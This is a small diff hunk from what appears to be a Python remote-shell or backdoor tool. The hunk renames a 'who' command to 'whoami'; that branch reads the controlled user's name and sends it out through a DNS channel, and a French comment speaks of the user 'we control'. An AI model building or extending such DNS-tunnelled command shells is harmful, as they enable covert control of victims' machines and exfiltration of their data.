@@ -135,7 +135,7 @@ def shell_interpreter(socket):
                     send_dns(output)
 
             # quel utilisateur on contrôle
-            elif cmd[0] == "who":
+            elif cmd[0] == "whoami":
                 output = os.environ.get('USERNAME')
                 output = chunk(output)
                 send_dns(output)
